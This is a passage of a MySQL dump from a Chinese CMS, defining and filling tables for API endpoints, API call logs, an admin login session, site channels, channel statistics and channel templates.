INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (58,'站内信单信息获取','/api/message/get.jspx','011702',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (59,'站内信息发送','/api/message/send.jspx','011703',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (60,'站内信草稿修改','/api/message/draftUpdate.jspx','011703',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (61,'站内信草稿发送','/api/message/draftToSend.jspx','011704',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (62,'删除站内信到回收站','/api/message/trash.jspx','011705',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (63,'还原站内信息','/api/message/revert.jspx','011706',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (64,'删除站内信','/api/message/delete.jspx','011707',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (65,'上传文件','/api/upload/o_upload.jspx','011801',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (66,'上传文库文档','/api/upload/o_upload_doc.jspx','011802',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (67,'内容打赏记录','/api/order/getByContent.jspx','011901',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (68,'我的消费记录和我的订单','/api/order/myorders.jspx','011902',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (69,'收益统计','/api/order/chargelist.jspx','011903',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (70,'提现申请','/api/draw/apply.jspx','011904',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (71,'删除提现申请','/api/draw/delete.jspx','011905',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (72,'提现申请列表','/api/draw/list.jspx','011906',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (73,'个人账户信息获取','/api/account/get.jspx','011907',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (74,'登陆','/api/user/login.jspx','012001',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (75,'退出','/api/user/logout.jspx','012002',0,0,0,0,0,0,NULL);
INSERT INTO `jc_api_info` (`id`,`api_name`,`api_url`,`api_code`,`disabled`,`limit_call_day`,`call_total_count`,`call_month_count`,`call_week_count`,`call_day_count`,`last_call_time`) VALUES (76,'用户状态检查','/api/user/getStatus.jspx','012003',0,0,0,0,0,0,NULL);

#
# Source for table jc_api_record
#

CREATE TABLE `jc_api_record` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `api_account` int(11) NOT NULL DEFAULT '0' COMMENT '调用的账户',
  `call_ip` varchar(255) DEFAULT '' COMMENT '调用的IP',
  `api_info_id` int(11) DEFAULT '0' COMMENT '接口',
  `api_call_time` datetime NOT NULL COMMENT '调用时间',
  `call_time_stamp` bigint(20) NOT NULL DEFAULT '0' COMMENT '调用的时间戳',
  `sign` varchar(100) NOT NULL DEFAULT '' COMMENT '签名数据(不允许重复调用)',
  PRIMARY KEY (`id`),
  KEY `fk_api_record_account` (`api_account`),
  KEY `fk_api_info` (`api_info_id`),
  KEY `index_jc_api_record_sign` (`sign`)
) ENGINE=InnoDB AUTO_INCREMENT=320 DEFAULT CHARSET=utf8 COMMENT='API调用记录';

#
# Dumping data for table jc_api_record
#

INSERT INTO `jc_api_record` (`id`,`api_account`,`call_ip`,`api_info_id`,`api_call_time`,`call_time_stamp`,`sign`) VALUES (323,1,'192.168.0.158',NULL,'2017-12-26 18:44:45',1514285085291,'7275DAC8E171E5E8175A26E8ED094610');
INSERT INTO `jc_api_record` (`id`,`api_account`,`call_ip`,`api_info_id`,`api_call_time`,`call_time_stamp`,`sign`) VALUES (324,1,'192.168.0.158',NULL,'2017-12-26 18:44:51',1514285091195,'46D8F2E55648D13BAA08A2F69E165D0E');
INSERT INTO `jc_api_record` (`id`,`api_account`,`call_ip`,`api_info_id`,`api_call_time`,`call_time_stamp`,`sign`) VALUES (325,1,'192.168.0.158',NULL,'2017-12-26 18:44:54',1514285094160,'A0C2BBA82433473A0AF1A24E407B7C75');

#
# Source for table jc_api_user_login
#

CREATE TABLE `jc_api_user_login` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `session_key` varchar(100) DEFAULT '' COMMENT 'sesssionKey',
  `username` varchar(255) NOT NULL DEFAULT '' COMMENT '用户名',
  `login_time` timestamp NOT NULL  ON UPDATE CURRENT_TIMESTAMP COMMENT '登陆时间',
  `login_count` int(11) NOT NULL DEFAULT '0' COMMENT '登陆次数',
  `active_time` timestamp NOT NULL  COMMENT '最后活跃时间',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='API用户登录表';

#
# Dumping data for table jc_api_user_login
#

INSERT INTO `jc_api_user_login` (`id`,`session_key`,`username`,`login_time`,`login_count`,`active_time`) VALUES (4,'EFF9F6ADE387F76F04638010D93E2AFC','admin','2017-12-26 18:44:45',1,'2017-12-26 18:46:10');

#
# Source for table jc_channel
#

CREATE TABLE `jc_channel` (
  `channel_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `parent_id` int(11) DEFAULT NULL COMMENT '父栏目ID',
  `channel_path` varchar(30) DEFAULT NULL COMMENT '访问路径',
  `lft` int(11) NOT NULL DEFAULT '1' COMMENT '树左边',
  `rgt` int(11) NOT NULL DEFAULT '2' COMMENT '树右边',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否有内容',
  `is_display` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  PRIMARY KEY (`channel_id`),
  KEY `fk_jc_channel_model` (`model_id`),
  KEY `fk_jc_channel_parent` (`parent_id`),
  KEY `fk_jc_channel_site` (`site_id`),
  KEY `index_jc_channel_lft` (`lft`),
  KEY `index_jc_channel_rgt` (`rgt`)
) ENGINE=InnoDB AUTO_INCREMENT=94 DEFAULT CHARSET=utf8 COMMENT='CMS栏目表';

#
# Dumping data for table jc_channel
#

INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (75,1,1,NULL,'news',1,2,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (76,5,1,NULL,'pic',3,4,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (77,6,1,NULL,'video',5,6,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (78,4,1,NULL,'download',7,16,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (79,8,1,NULL,'job',17,18,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (80,2,1,NULL,'survey',19,20,11,0,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (82,2,1,NULL,'message',21,22,10,0,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (90,4,1,78,'xtrj',8,9,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (91,4,1,78,'mtzs',10,11,10,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (92,4,1,78,'jptj',12,13,9,1,1);
INSERT INTO `jc_channel` (`channel_id`,`model_id`,`site_id`,`parent_id`,`channel_path`,`lft`,`rgt`,`priority`,`has_content`,`is_display`) VALUES (93,4,1,78,'yxyl',14,15,10,1,1);

#
# Source for table jc_channel_attr
#

CREATE TABLE `jc_channel_attr` (
  `channel_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_channel` (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目扩展属性表';

#
# Dumping data for table jc_channel_attr
#


#
# Source for table jc_channel_count
#

CREATE TABLE `jc_channel_count` (
  `channel_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT '0' COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT '0' COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT '0' COMMENT '日访问数',
  `content_count_total` int(11) NOT NULL DEFAULT '0' COMMENT '内容发布数',
  `content_count_day` int(11) NOT NULL DEFAULT '0' COMMENT '内容今日发布数',
  `content_count_week` int(11) NOT NULL DEFAULT '0' COMMENT '内容本周发布数',
  `content_count_month` int(11) NOT NULL DEFAULT '0' COMMENT '内容本月发布数',
  `content_count_year` int(11) NOT NULL DEFAULT '0' COMMENT '内容今年发布数',
  PRIMARY KEY (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目访问量计数表';

#
# Dumping data for table jc_channel_count
#

INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (75,443,126,126,0,24,18,18,18,24);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (76,203,18,17,1,11,0,0,0,11);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (77,38,24,24,0,15,0,0,0,15);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (78,25,5,5,0,14,0,0,0,14);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (79,49,19,19,0,10,0,0,0,10);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (80,33,6,6,0,0,0,0,0,0);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (82,6,0,0,0,0,0,0,0,0);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (90,12,1,1,0,4,0,0,0,4);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (91,2,2,2,0,8,0,0,0,8);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (92,12,7,7,0,0,0,0,0,0);
INSERT INTO `jc_channel_count` (`channel_id`,`views`,`views_month`,`views_week`,`views_day`,`content_count_total`,`content_count_day`,`content_count_week`,`content_count_month`,`content_count_year`) VALUES (93,2,0,0,0,2,0,0,0,2);

#
# Source for table jc_channel_ext
#

CREATE TABLE `jc_channel_ext` (
  `channel_id` int(11) NOT NULL,
  `channel_name` varchar(100) NOT NULL COMMENT '名称',
  `final_step` tinyint(4) DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) DEFAULT NULL COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_static_channel` char(1) NOT NULL DEFAULT '0' COMMENT '是否栏目静态化',
  `is_static_content` char(1) NOT NULL DEFAULT '0' COMMENT '是否内容静态化',
  `is_access_by_dir` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用目录访问',
  `is_list_child` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用子栏目列表',
  `page_size` int(11) NOT NULL DEFAULT '20' COMMENT '每页多少条记录',
  `channel_rule` varchar(150) DEFAULT NULL COMMENT '栏目页生成规则',
  `content_rule` varchar(150) DEFAULT NULL COMMENT '内容页生成规则',
  `link` varchar(255) DEFAULT NULL COMMENT '外部链接',
  `tpl_channel` varchar(100) DEFAULT NULL COMMENT '栏目页模板',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容页模板',
  `title_img` varchar(100) DEFAULT NULL COMMENT '缩略图',
  `content_img` varchar(100) DEFAULT NULL COMMENT '内容图',
  `has_title_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有缩略图',
  `has_content_img` tinyint(1) NOT NULL DEFAULT '0' COMMENT '内容是否有内容图',
  `title_img_width` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT '139' COMMENT '内容标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT '310' COMMENT '内容内容图高度',
  `comment_control` int(11) NOT NULL DEFAULT '0' COMMENT '评论(0:匿名;1:会员一次;2:关闭,3会员多次)',
  `allow_updown` tinyint(1) NOT NULL DEFAULT '1' COMMENT '顶踩(true:开放;false:关闭)',
  `is_blank` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否新窗口打开',
  `title` varchar(255) DEFAULT NULL COMMENT 'TITLE',
  `keywords` varchar(255) DEFAULT NULL COMMENT 'KEYWORDS',
  `description` varchar(255) DEFAULT NULL COMMENT 'DESCRIPTION',
  `allow_share` tinyint(1) NOT NULL DEFAULT '0' COMMENT '分享(true:开放;false:关闭)',
  `allow_score` tinyint(1) NOT NULL DEFAULT '0' COMMENT '评分(true:开放;false:关闭)',
  `tpl_mobile_channel` varchar(100) DEFAULT NULL COMMENT '手机栏目页模板',
  PRIMARY KEY (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目内容表';

#
# Dumping data for table jc_channel_ext
#

INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (75,'新闻',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/news.html',NULL,NULL,NULL,0,0,510,288,310,310,0,1,0,NULL,NULL,NULL,1,1,'/WEB-INF/t/cms/www/mobile/channel/news.html');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (76,'图库',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,510,288,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (77,'视频',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,1,0,510,288,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (78,'下载',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (79,'招聘',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,NULL,NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (80,'网络调查',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/alone/alone_survey.html',NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'/WEB-INF/t/cms/www/mobile/alone/alone_survey.html.html');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (82,'留言板',NULL,NULL,'0','0','0','0',10,NULL,NULL,'/guestbook.jspx',NULL,NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (90,'系统软件',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_child.html',NULL,NULL,NULL,1,1,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (91,'媒体助手',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_child.html',NULL,NULL,NULL,1,1,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (92,'精品推荐',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_recommend.html',NULL,NULL,NULL,0,0,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');
INSERT INTO `jc_channel_ext` (`channel_id`,`channel_name`,`final_step`,`after_check`,`is_static_channel`,`is_static_content`,`is_access_by_dir`,`is_list_child`,`page_size`,`channel_rule`,`content_rule`,`link`,`tpl_channel`,`tpl_content`,`title_img`,`content_img`,`has_title_img`,`has_content_img`,`title_img_width`,`title_img_height`,`content_img_width`,`content_img_height`,`comment_control`,`allow_updown`,`is_blank`,`title`,`keywords`,`description`,`allow_share`,`allow_score`,`tpl_mobile_channel`) VALUES (93,'游戏娱乐',NULL,NULL,'0','0','0','0',10,NULL,NULL,NULL,'/WEB-INF/t/cms/www/default/channel/download_child.html',NULL,NULL,NULL,1,1,139,139,310,310,0,1,0,NULL,NULL,NULL,0,0,'');

#
# Source for table jc_channel_model
#

CREATE TABLE `jc_channel_model` (
  `channel_id` int(11) NOT NULL,
  `model_id` int(11) NOT NULL COMMENT '模型id',
  `tpl_content` varchar(100) DEFAULT NULL COMMENT '内容模板',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  `tpl_mobile_content` varchar(100) DEFAULT NULL COMMENT '手机内容页模板',
  PRIMARY KEY (`channel_id`,`priority`),
  KEY `fk_jc_model_channel_m` (`model_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='栏目可选内容模型表';

#
# Dumping data for table jc_channel_model
#

INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (75,1,'/WEB-INF/t/cms/www/default/content/news2.html',0,'/WEB-INF/t/cms/www/mobile/content/news.html');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (76,5,'',0,'');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (77,6,'',0,'');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (79,8,'',0,'');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (90,4,'',0,'');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (91,4,'',0,'');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (92,4,'',0,'');
INSERT INTO `jc_channel_model` (`channel_id`,`model_id`,`tpl_content`,`priority`,`tpl_mobile_content`) VALUES (93,4,'',0,'');

#
# Source for table jc_channel_txt
#

CREATE TABLE `jc_channel_txt` (
  `channel_id` int(11) NOT NULL,
  `txt` longtext COMMENT '栏目内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`channel_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目文本表';

#
# Dumping data for table jc_channel_txt
#


#
# Source for table jc_channel_user
#

CREATE TABLE `jc_channel_user` (
  `channel_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`user_id`),
  KEY `fk_jc_channel_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目用户关联表';

#
# Dumping data for table jc_channel_user
#


#
# Source for table jc_chnl_group_contri
#

CREATE TABLE `jc_chnl_group_contri` (
  `channel_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`channel_id`,`group_id`),
  KEY `fk_jc_channel_group_c` (`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS栏目投稿会员组关联表';

#
# Dumping data for table jc_chnl_group_contri
#

INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (75,1);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (75,2);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (75,3);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (76,1);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (76,2);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (76,3);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (77,1);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (77,2);
INSERT INTO `jc_chnl_group_contri` (`channel_id`,`group_id`) VALUES (77,3);
